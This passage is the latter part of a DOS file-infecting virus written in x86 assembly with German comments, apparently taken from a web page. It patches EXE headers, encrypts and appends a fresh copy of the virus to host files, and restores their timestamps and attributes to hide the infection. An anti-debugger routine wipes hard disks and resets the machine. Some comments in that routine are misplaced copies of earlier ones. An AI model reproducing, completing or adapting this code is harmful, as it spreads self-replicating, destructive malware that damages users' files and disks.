GO_EXE:     MOV AX,WORD PTR CS:[PUFFER+4]       ;FLÑnge (Seiten zu 512 Bytes)
            DEC AX                              ;in <AX>.
            MOV CX,512                          ;Mit 512 malnehmen, und somit
            MUL CX                              ;in BYTEs wandeln.
            ADD AX,WORD PTR CS:[PUFFER+2]       ;BYTEs der letzten Page drauf
            JNC EXE_TEST                        ;öBERTRAG? NEIN --> EXE_TEST
            INC DX                              ;HI-Word von FSize erhîhen!
;------------------------------------------------------------------------------
EXE_TEST:   CMP AX,SI               ;LO-WORD im EXE-Kopf=LO-WORD der FGrî·e?
            JNE POP_CLOSE           ;NEIN --> CLOSE
            CMP DX,DI               ;HI-WORD im EXE-Kopf=HI-WORD der FGrî·e?
            JE  SET_EXE             ;JA --> SET_EXE
POP_CLOSE:  POP AX                  ;Datum wird nicht gebraucht (vom Stack)!
            POP DX                  ;Einfach in <DX> rein...
            JMP CLOSE               ;NEIN --> CLOSE
;------------------------------------------------------------------------------
; EXE: RÅcksprung & JMP setzen.
;------------------------------------------------------------------------------
SET_EXE:    MOV AX,SI               ;LO-WORD der LÑnge in <AX> sichern
            MOV DX,DI               ;HI-WORD der LÑnge in <DX> sichern
            MOV CL,4                ;LOW-WORD der DateilÑnge
            SHR AX,CL               ;in PARAs wandeln
            MOV CL,12               ;Unteren 4 BITs des HI-WORD der DateilÑnge
            SHL DX,CL               ;in oberen 4 BITs verschieben
            OR AX,DX                ;Beides verknÅpfen: DateilÑnge in PARAs
;------------------------------------------------------------------------------
            AND SI,01111B           ;Bis auf die unteren 4 BITs ausmaskieren
            MOV DI,10000B           ;Wieviel bleibt zu einem PARA Åbrig...
            SUB DI,SI               ;in <DI> merken
            AND DI,01111B           ;Bis auf die unteren 4 BITs ausmaskieren
            JZ NEU_KOPF             ;PARA ist schon voll --> NEU_KOPF
            INC AX                  ;Neues <CS> um einen PARA erhîhen
;------------------------------------------------------------------------------
; EXE-KopflÑnge abziehen, und somit neues <CS> in <AX>:
;------------------------------------------------------------------------------
NEU_KOPF:   SUB AX,WORD PTR CS:[PUFFER+8]       ;DateilÑnge MINUS Kopf
;------------------------------------------------------------------------------
; RÅcksprung vorbereiten, Differenz zwischen neuem <CS> und altem <CS>:
;------------------------------------------------------------------------------
            MOV CX,AX                           ;Neues <CS> in <CX>
            MOV DX,WORD PTR CS:[PUFFER+16H]     ;Altes <CS> in <DX>
            SUB CX,DX                           ;Unterschied zw. Neu und Alt
            MOV WORD PTR CS:[EXE_SEG],CX        ;RÅcksprung vorbereiten (SEG)
;------------------------------------------------------------------------------
; Neuen EXE-Start setzen, alten <IP> in den RÅcksprungpuffer schieben:
;------------------------------------------------------------------------------
            MOV CX,WORD PTR CS:[PUFFER+14H]     ;Altes <IP> in <CX>
            MOV WORD PTR CS:[HOST_OFS],CX       ;RÅcksprung vorbereiten (OFS)
;------------------------------------------------------------------------------
; Neues <CS> im EXE-Kopf eintragen, neuen <IP> im EXE-Kopf auf EntCoder setzten:
;------------------------------------------------------------------------------
            MOV WORD PTR CS:[PUFFER+16H],AX              ;neues <CS>
            MOV WORD PTR CS:[PUFFER+14H],OFFSET CODE_BUF ;neuer <IP>
;------------------------------------------------------------------------------
; Alten Stack merken und NEUEN auf den Cryptpuffer/Virusinternen Stack setzen:
;------------------------------------------------------------------------------
            MOV CX,AX                                ;neues <SS>=<CS> in CX
            XCHG CX,WORD PTR CS:[PUFFER+0EH]         ;<SS> setzen und auslesen
            SUB AX,CX                                ;Differenz zw. neu und alt
            MOV WORD PTR CS:[OFFSET ALT_SS],AX       ;speichern
            MOV CX,WORD PTR CS:[PUFFER+10H]          ;altes <SP> auslesen
            MOV WORD PTR CS:[OFFSET ALT_SP],CX       ;und auch speichern
            MOV WORD PTR CS:[PUFFER+10H],OFFSET STACKTOP ;neuen <SP> setzen
;------------------------------------------------------------------------------
            MOV AX,WORD PTR CS:[PUFFER+2]       ;Anzahl BYTEs der letzten Page
PATCH_SIZE  EQU $+1                             ;Patch-Label
            ADD AX,0                            ;ViruslÑnge dazu
            ADD AX,DI                           ;BYTEs des letzten PARAs dazu
            MOV DX,AX                           ;Diesen Wert in <DX> merken!
            AND AX,0111111111B                  ;High 6 Bits raus (512 Åbrig!)
            JNZ EXE_ZERO                        ;Sonderfall? NEIN --> EXE_ZERO
            MOV AX,512                          ;Letzte Seite=Voll
            SUB DX,512                          ;Anzahl Seiten weniger 1
EXE_ZERO:   MOV WORD PTR CS:[PUFFER+2],AX       ;BYTEs der letzten Seite
            MOV CL,9                            ;Den Rest in Seiten zu jeweils
            SHR DX,CL                           ;512 BYTEs umrechnen (shiften)
            ADD WORD PTR CS:[PUFFER+4],DX       ;Auf die original LÑnge drauf!

;------------------------------------------------------------------------------
;EXE-Kopf erfolgreich modifiziert! Diesen Kopf jetzt in die Datei schreiben:
;------------------------------------------------------------------------------
            DOS_FWRITE BX,18H,DS,<OFFSET PUFFER> ;Write EXE-Kopf!
            JNC INFECT                           ;OK --> INFECT
            JMP MODIFY                           ;FEHLER --> MODIFY

;------------------------------------------------------------------------------
; File-Ptr spacen (max 15 Bytes) und GenerationszÑhler erhîhen:
;------------------------------------------------------------------------------
INFECT:     DOS_FSEEK BX,2,0,DI                 ;FPtr spacen - Enderelativ!
            ZAEHLER CS:[KOPIE]                  ;KOPIE erhîhen

;------------------------------------------------------------------------------
; Virus Copy-Puffer auslagern:
;------------------------------------------------------------------------------
COPY_VIR:   MOV ES,BP               ;Segment des Crypt-Puffers gemerkt
            XOR SI,SI               ;Quellen Register
            XOR DI,DI               ;Ziel Register
            MOV CX,OFFSET CODE_BUF  ;Anzahl zu kopierender Bytes, bis CODE_BUF!
            REP MOVSB               ;und kopieren...

            CALL GET_RND            ;Zufallszahl in <AX>
            MOV ES:[CRYPT],AX       ;CODER-INITIAL-Wert merken

;------------------------------------------------------------------------------
; Neuen Virus im Copy-Puffer verschlÅsseln:
;------------------------------------------------------------------------------
            PUSH BX                             ;Handle sichern
            COD_RUN                             ;Coder starten im Segement <ES>

            POP BX                              ;Handle zurÅck
            MOV SI,WORD PTR CS:[PATCH_SIZE]     ;LÑnge des neuen Virus
            MOV BP,ES                           ;Copy-Speicher Segment merken

            CALL GET_RND                        ;Zufallszahl in <AX>
            MOV AL,ID_SUM                       ;Mu· ID_SUM ergeben
            SUB AL,AH                           ;Darum SUB...
            MOV ES:[SI-2],AX                    ;In die letzten beiden Bytes

;------------------------------------------------------------------------------
; Host mit unserem Virus infizieren:
;------------------------------------------------------------------------------
            DOS_FWRITE BX,SI,ES,0               ;Virus anhÑngen!

;------------------------------------------------------------------------------
; Altes DATUM und alte ZEIT NEU setzen:
;------------------------------------------------------------------------------
MODIFY:     POP DX                              ;Altes Datum holen
            POP CX                              ;Alte Uhrzeit holen
            DOS_FSETIME BX,CX,DX                ;Zeit restaurieren!
;------------------------------------------------------------------------------
CLOSE:      DOS_FCLOSE BX                       ;Datei schliessen!

;------------------------------------------------------------------------------
; Attribut der Datei restaurieren:
;------------------------------------------------------------------------------
BREAK:      POP_SEGOFS DS,DX                    ;[SEG:OFS] des FNamens: [DS:DX]
            POP CX                              ;Attribut in <CX>
            DOS_SETATTR CX,DS,DX                ;Attribut einer Datei setzen

;------------------------------------------------------------------------------
; INT 13H & INT 24H auf neuen (nach dem Virus) Vektor setzen:
;------------------------------------------------------------------------------
REST_INT:   XOR AX,AX                           ;<DS> wieder auf...
            MOV DS,AX                           ;...SEG 0

            POP_SEGOFS AX,DX                    ;[SEG:OFS] des Vektors: [AX:DX]
            MOV WORD PTR DS:[13H*4],DX          ;LO-Vector vin INT 13H zurÅck
            MOV WORD PTR DS:[13H*4+2],AX        ;HI-Vector von INT 13H zurÅck

            POP_SEGOFS AX,DX                    ;[SEG:OFS] des Vektors: [DS:DX]
            MOV WORD PTR DS:[24H*4],DX          ;LO-Vector vin INT 13H zurÅck
            MOV WORD PTR DS:[24H*4+2],AX        ;HI-Vector von INT 13H zurÅck

;------------------------------------------------------------------------------
; Speicherblock freigeben:
;------------------------------------------------------------------------------
            DOS_FREEMEM BP                      ;Speicherblock freigeben

;------------------------------------------------------------------------------
            JMP END21POP                        ;INT Beenden --> END21POP

NEU21       ENDP

;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ NEU24:                                                                     ≥
;≥----------------------------------------------------------------------------≥
;≥ Neuer INT 24H (Critical Error) Handler.                                    ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
NEU24       PROC FAR

            MOV AL,3                            ;Aktuelle Funktion abbrechen.
            IRET                                ;--> ZurÅck zum Fehler

NEU24       ENDP

;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ GET_RND:                                                                   ≥
;≥----------------------------------------------------------------------------≥
;≥ Zufallszahl in <AX> zurÅckliefern (RND.INC):                               ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
GET_RND     PROC NEAR

            PUSH BX                 ;REGs sichern
            PUSH CX                 ; "      "
            PUSH DX                 ; "      "

            RND AX,CS:[INITWERT]    ;Mit RNDINIT zuerst initialisieren! (s.o.)

            POP DX                  ;REGs zurÅckholen
            POP CX                  ; "        "
            POP BX                  ; "        "

            RET                     ;--> Back to sender

GET_RND     ENDP

;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ GOODBYE:                                                                   ≥
;≥----------------------------------------------------------------------------≥
;≥ Debugger aktiv? Wenn JA --> HDs lîschen und einen Reset ausfÅhren!         ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
;##############################################################################
IF SCHARF
  GOODBYE   PROC NEAR
;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
;Vector von INT 4 testen, wenn kein Debugger aktiv ist, zeigt der Vector auf
;einen IRET (0cfh) !!!
;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
            XOR AX,AX                         ;<DS> wieder auf...
            MOV ES,AX                         ;...SEG 0
            LES BX,ES:[1*4]
            CMP BYTE PTR ES:[BX],0CFH         ;[SEG:OFS] des Vektors: [AX:DX]
            JNE WITZIG                        ;LO-Vector vin INT 13H zurÅck
            POP AX                            ;HI-Vector von INT 13H zurÅck
            SUB AX,BP
            CMP AX,OFFSET FAKE_INTO+1         ;[SEG:OFS] des Vektors: [DS:DX]
            JNE WITZIG                        ;LO-Vector vin INT 13H zurÅck
                                              ;HI-Vector von INT 13H zurÅck
            POP AX
            POP BX                            ;<DS> wieder auf...
                                              ;...SEG 0
            POP ES
            JMP NO_GOODY                      ;[SEG:OFS] des Vektors: [AX:DX]
WITZIG:     IF ZERSTOER                       ;LO-Vector vin INT 13H zurÅck
              LOESCH                          ;HI-Vector von INT 13H zurÅck
            ENDIF
;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

            RESET                                                               ;--> RESET

  GOODBYE   ENDP
ENDIF
;##############################################################################

;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ SEEK_BEG:                                                                  ≥
;≥----------------------------------------------------------------------------≥
;≥ Dateizeiger auf den Anfang der Datei setzen.                               ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
SEEK_BEG    PROC NEAR

            DOS_FSEEK BX,0,0,0      ;FPtr relativ zum Anfang
            RET                     ;--> ZurÅck!

SEEK_BEG    ENDP

;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ GODOS:                                                                     ≥
;≥----------------------------------------------------------------------------≥
;≥ GODOS: Direkter Aufruf von INT 21H                                         ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
GODOS       PROC NEAR

            PUSHF
            CALL DWORD PTR CS:[ALT21]           ;INT 21H direkt aufrufen.
            RET

GODOS       ENDP

;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ VIRUSBUF:                                                                  ≥
;≥----------------------------------------------------------------------------≥
;≥ Variablen und Puffervereinbarungen.                                        ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
VIRUSBUF    PROC

;------------------------------------------------------------------------------
; Codiervarianten ablegen:
;------------------------------------------------------------------------------
            VAR_CODER ,CRYP_STRT,CRYP_END,,CRYPT

;------------------------------------------------------------------------------
; Allgemeine Variablen:
;------------------------------------------------------------------------------
            VAR_INTERN              ;Virus-interne Vars
VIR_END     EQU $                   ;ENDE des Virus
            VAR_EXTERN              ;Virus-externe Vars

VIRUSBUF    ENDP

;------------------------------------------------------------------------------
VIRUS       ENDS

            END START

;{----------------------------------------------------------------------------}

</textarea></td></tr></table></body></html>
